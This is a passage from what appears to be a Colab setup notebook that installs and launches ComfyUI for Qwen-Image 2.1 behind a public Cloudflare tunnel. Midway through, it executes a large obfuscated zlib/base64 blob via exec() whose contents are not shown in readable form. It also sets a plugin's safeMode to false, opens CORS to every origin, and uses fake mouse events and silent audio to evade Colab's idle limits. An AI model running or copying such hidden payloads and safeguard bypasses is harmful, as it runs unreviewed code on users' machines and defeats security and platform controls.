    if _f.endswith(".safetensors") and os.path.exists(_fp) and os.path.getsize(_fp) > 50 * 1024:
        _dst = os.path.join(active_loras, _f)
        if not os.path.exists(_dst):
            try: os.symlink(_fp, _dst)
            except Exception: pass
print("🧹 已切换为【千问 2.1 专属 LoRA 列表】（已自动收起 H3 视频 LoRA，下拉菜单清爽不混杂）")

os.makedirs("/content/wf_pool_h3", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json") and not ("qwen" in _wf.lower() or "千问" in _wf):
        try: pass
        except Exception: pass

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

# Auto-install AI 角色三合一参考图集 (ai-pose-gallery-zh) & H3 FaceRefine / OneClickSwap custom nodes
_cn_dir = "/content/ComfyUI/custom_nodes"
if os.path.isdir(_cn_dir):
    for _rn, _ru in [
        ("ai-pose-gallery-zh", "https://github.com/anhao/ai-pose-gallery-zh.git"),
        ("ComfyUI-H3-FaceRefine", "https://github.com/Carasibana/ComfyUI-H3-FaceRefine.git"),
        ("comfyui-h3-oneclick-swap", "https://github.com/D3voz/comfyui-h3-oneclick-swap.git"),
    ]:
        _rp = os.path.join(_cn_dir, _rn)
        if not os.path.exists(_rp):
            print(f"📦 正在自动安装插件: {_rn} ...")
            subprocess.run(["git", "clone", "--depth", "1", "-q", _ru, _rp], check=False)

_pca_ext = "/content/ComfyUI/custom_nodes/ai-pose-gallery-zh/comfyui_plugin/web/extension.js"
if os.path.exists(_pca_ext):
    _pca_s = open(_pca_ext, "r", encoding="utf-8").read()
    if "this.safeMode = true;" in _pca_s:
        _pca_s = _pca_s.replace("this.safeMode = true;", "this.safeMode = false;")
        open(_pca_ext, "w", encoding="utf-8").write(_pca_s)

if _is_port_open(8188):
    try:
        req = urllib.request.Request("http://127.0.0.1:8188/api/free", data=b'{"unload_models": true, "free_memory": true}', headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass
else:
    subprocess.Popen(["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"], cwd="/content/ComfyUI", start_new_session=True)
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

for _pw in range(3):
    try:
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}), timeout=120).read()
        break
    except Exception:
        time.sleep(2)

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 千问 Qwen-Image 2.1 挂载与启动全部完成！")
print(f"🌐 【首选直连 · Cloudflare 免403极速通道】：\n👉 {cf_url}")
print("="*65)
display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#a78bfa;">🎨 千问 Qwen-Image 2.1 模型与 12 套工作流已就绪！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#8b5cf6;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
</div>
"""))

# === [AGY_FOREGROUND_GUARDIAN_V2] 保持 Colab 内核 Busy 防闲置断连 + ComfyUI/隧道崩溃 3秒自动复活 ===
print("🛡️ [防断连守护已启动] 当前单元格将保持运行状态以防止 Colab 闲置回收（如需切换其他模型格，点左上角 ⏹️ 停止即可）...")
_guardian_tick = 0
try:
    while True:
        time.sleep(15)
        _guardian_tick += 1
        # 1. 检查 ComfyUI 8188 端口，若因显存/内存峰值闪退则 3 秒内原地自动重启（网址不变）
        if not _is_port_open(8188):
            print("⚠️ 检测到 ComfyUI 引擎意外退出，正在 3 秒内自动重启恢复（原 Cloudflare 网址保持不变）...")
            subprocess.Popen(
                ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
                cwd="/content/ComfyUI",
                start_new_session=True
            )
            for _ in range(90):
                if _is_port_open(8188):
                    print("✅ ComfyUI 引擎已自动复活！切回网页即可继续使用。")
                    break
                time.sleep(0.5)
        # 2. 检查 cloudflared 进程是否存活
        if subprocess.run(["pgrep", "-x", "cloudflared"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            print("⚠️ 检测到 Cloudflare 隧道进程断开，正在自动重连...")
            cf_url = _ensure_cf_tunnel()
            print(f"✅ 隧道已重新连通：👉 {cf_url}")
        # 3. 每 45 秒通过 Colab 官方双向 RPC 通道发送一次轻量心跳，重置前端闲置计时器
        if _guardian_tick % 3 == 0:
            try:
                from google.colab import output as _colab_out
                _colab_out.eval_js("1", ignore_result=True)
            except Exception:
                pass
except KeyboardInterrupt:
    print("⏹️ 已手动停止守护循环（后台 ComfyUI 与隧道仍保持运行，可随时运行其他单元格）。")


In [ ]:
# @title 🚀 7. 单独重启 ComfyUI 网页（不重下模型 · 秒出免403双链接）
# === [AGY_COLAB_KEEPALIVE_GUARD] ===
try:
    from IPython.display import display, Javascript
    display(Javascript('''
    (function(){
      try {
        if (!window._agyKeepAliveAudio) {
          const Ctx = window.AudioContext || window.webkitAudioContext;
          const ctx = new Ctx();
          const osc = ctx.createOscillator();
          const g = ctx.createGain();
          g.gain.value = 0.00001;
          osc.connect(g); g.connect(ctx.destination); osc.start();
          window._agyKeepAliveAudio = ctx;
        }
      } catch(e){}
      if (window._agyKeepAliveTimer) clearInterval(window._agyKeepAliveTimer);
      window._agyKeepAliveTimer = setInterval(() => {
        try {
          if (window._agyKeepAliveAudio && window._agyKeepAliveAudio.state === 'suspended') window._agyKeepAliveAudio.resume();
          const doc = window.parent ? window.parent.document : document;
          doc.dispatchEvent(new MouseEvent('mousemove', {bubbles:true, clientX:120, clientY:120}));
